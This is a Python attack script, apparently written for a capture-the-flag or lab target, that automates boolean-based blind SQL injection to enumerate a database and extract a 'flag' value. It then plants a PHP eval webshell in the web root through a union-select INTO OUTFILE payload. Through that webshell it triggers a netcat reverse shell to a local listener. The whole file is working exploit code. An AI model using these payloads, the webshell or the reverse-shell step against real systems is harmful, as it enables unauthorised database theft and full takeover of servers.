##################################################################
# Author:   xiabee
# Date:     2021/5/19
# Env:      Linux-python3.8
# Desc:     Bool-based & union-select SQL injetion and getshell
##################################################################

import requests
import random
import string
import socket
import time
import os

url = 'http://localhost:5000'
# target url
host = 'localhost'
# target hostname
success_mark = "Dumb"
# flag of bool injection

ascii_range = range(ord('a'), 1+ord('z'))
str_range = list(range(32, 256))
# dict


def ipofhost():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip
# query the local IP for shell rebound


def rand_str(num):
    salt = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return salt
# generate random strings


def pout(strstr):
    print()
    print("================================================================")
    print(strstr)
    print("================================================================")
    print()
# attract attention 


def dbs_num():
    for i in range(0, 9):
        payload = "?id=1 and ord(mid((select ifnull(cast(count(distinct(schema_name)) as char),0x20) " + \
            "from information_schema.schemata),1,1))=ord({})".format(i)
        # bool-based injection
        r = requests.get(url + payload)
        if success_mark in r.text:
            print()
            pout('Number of DBS: {}'.format(i))
            print()
            return i
# detect the number of dbs


def dbs_name(length_of_database):
    database_name = ''
    for length in range(1, length_of_database + 1):
        for x in range(32, 256):
            # test all readable char
            payload = '?id=1 and ascii(substr(database(),{index},{index}))<{x}--+'.format(
                index=length, x=x)
                # bool-based injection
            r = requests.get(url + payload)
            if success_mark in r.text:
                database_name += chr(x-1)
                print("[-]current test: {}".format(database_name))
                break

    pout('Current DB: {}'.format(database_name))
# detect current db name 


def getLengthofDatabase():
    Len = 0
    for length in range(1, 50):
        payload = '?id=1 and length(database())<{}--+'.format(length)
        # bool-based injection
        print("[-]current test: {}".format(payload))
        r = requests.get(url + payload)
        if success_mark in r.text:
            Len = length - 1
            pout('Current database_lenth: {}'.format(Len))
            break
    return Len
# detect the length of current db


def getDatabase(length_of_database):
    name = ""
    for i in range(length_of_database):
        for j in ascii_range:
            new_url = url + \
                "?id=1 and substr(database(),{},1)='{}'".format(i+1, chr(j))
                # bool-based injection
            r = requests.get(new_url)
            if success_mark in r.text:
                name += chr(j)
                break
    return name
# detect the name of db


def getCountofTables(database):
    i = 1
    while True:
        new_url = url + \
            "?id=1 and (select count(*) from information_schema.tables where table_schema='{}')={}".format(database, i)
            # bool-based injection
        r = requests.get(new_url)
        if success_mark in r.text:
            return i
        i = i + 1
# detect length of tables


def getLengthListofTables(database, count_of_tables):
    length_list = []
    for i in range(count_of_tables):
        j = 1
        while True:
            new_url = url + \
                "?id=1 and length((select table_name from information_schema.tables where table_schema='{}' limit {},1))={}".format(
                    database, i, j)
                    # bool-based injection
            r = requests.get(new_url)
            if success_mark in r.text:
                length_list.append(j)
                break
            j = j + 1
    return length_list
# detect names of tables


def getTables(database, count_of_tables, length_list):
    tables = []
    for i in range(count_of_tables):
        name = ""
        for j in range(length_list[i]):
            for k in ascii_range:
                new_url = url + \
                    "?id=1 and substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)='{}'".format(
                        database, i, j+1, chr(k))
                        # bool-based injection
                r = requests.get(new_url)
                if success_mark in r.text:
                    name = name + chr(k)
                    break
        tables.append(name)
    return tables
# detect columns


def getCountofColumns(table):
    i = 1
    while True:
        new_url = url + \
            "?id=1 and (select count(*) from information_schema.columns where table_name='{}')={}".format(table, i)
            # bool-based injection
        r = requests.get(new_url)
        if success_mark in r.text:
            return i
        i = i + 1
# detect length of columns


def getLengthListofColumns(database, table, count_of_column):
    length_list = []
    for i in range(count_of_column):
        j = 1
        while True:
            new_url = url + \
                "?id=1 and length((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1))={}".format(
                    database, table, i, j)
                    # bool-based injection
            r = requests.get(new_url)
            if success_mark in r.text:
                length_list.append(j)
                break
            j = j + 1
    return length_list
# detect columns


def getColumns(database, table, count_of_columns, length_list):
    columns = []
    for i in range(count_of_columns):
        name = ""
        for j in range(length_list[i]):
            for k in ascii_range:
                new_url = url + "?id=1 and substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1)='{}'".format(
                    database, table, i, j+1, chr(k))
                    # bool-based injection
                r = requests.get(new_url)
                if success_mark in r.text:
                    name = name + chr(k)
                    break
        columns.append(name)
    return columns
# detect column names

def getData(database, table, column, str_list):
    ddd = ''
    for j in range(1, 35):
        for i in str_list:
            new_url = url + "?id=1 and substr((select {} from {}.{}),{},1)='{}'".format(
                column, database, table, j, chr(i))
                # bool-based injection
            r = requests.get(new_url)
            if success_mark in r.text:
                ddd += chr(i)
                print("[-]current test: {}".format(ddd))
                break
    pout(ddd)
# get the core data

def getshell():
    filename = rand_str(6)+'.php'
    payload = "?id=2988 union select 1,2, \"<?php eval(@$_POST['xiabee']);?>\" into outfile '/var/www/html/{}'--+".format(
        filename)
    # union-select injetion
    # inject one word Trojan to /var/www/html 
    # password of webshell is 'xiabee'

    new_url = url + payload
    r = requests.get(new_url)
    if "WELCOME" in r.text:
        pout("WEBSHELL LOADED SUCESSFULLY")
        print("[+] Webshell insert successfully!")
        print("[+] Webshell path:    {}/{}".format(url, filename))
        print("[+] Webshell content: {}".format("<?php eval(@$_POST['xiabee']);?>"))
        print("[+] Host IP: {}".format(ipofhost()))
        # inject success
    else:
        print("[-]Error! Insert {} failed!".format(filename))
        exit(1)

    xport = 7875
    # nc port

    shell_cmd = "nc -v {} {} -e /bin/bash".format(ipofhost(), xport)
    payload = "system(\'{}\');".format(shell_cmd)
    new_url = url + '/' + filename
    print("[+] Payload: xiabee={}".format(payload))
    # rebound shell for php

    pid = os.fork()
    if pid != 0:
        print("[+] Netcat started!")
        print()
        os.system('nc -nvlp {}'.format(xport))
        print("[+] Netcat ended!")
        pout("CONGRATULATIONS! ALL THINGS DOWN!")
        print("[~]Bye[~]")

    else:
        print("[+] Connecting...Please wait for a few seconds...")
        time.sleep(8)
        # sleep until nc process already started
        print()
        print("[+] Payload sended!")
        data = {'xiabee': payload}
        r = requests.post(url = new_url, data = data)
# rebound shell


if __name__ == '__main__':
    pout("BOOL-BASED SQL BLIND INJECTION AND UNION SELECT TO GETSHELL")
    print("Detecting Current Database...")
    print()
    len_dbs = getLengthofDatabase()
    database = getDatabase(len_dbs)
    count_of_tables = getCountofTables(database)
    dbs_name(len_dbs)

    print("[+]There are {} tables in this database".format(count_of_tables))
    print()
    print("Getting the table name...")
    length_list_of_tables = getLengthListofTables(database, count_of_tables)

    tables = getTables(database, count_of_tables, length_list_of_tables)
    for i in tables:
        print("[+] {}".format(i))

    print()
    print("Getting the column names in the flag table......")
    i = "flag"
    count_of_columns = getCountofColumns(i)
    print("[+]There are {} tables in the {} table".format(count_of_columns, i))
    length_list_of_columns = getLengthListofColumns(
        database, i, count_of_columns)
    columns = getColumns(database, i, count_of_columns, length_list_of_columns)
    for i in columns:
        print("[+] {}".format(i))

    print()
    print("[+]Testing the flag:")
    getData(database, "flag", "flag", str_range)
    # print the flag

    print("[+]Flag found!")
    getshell()
    # remote attack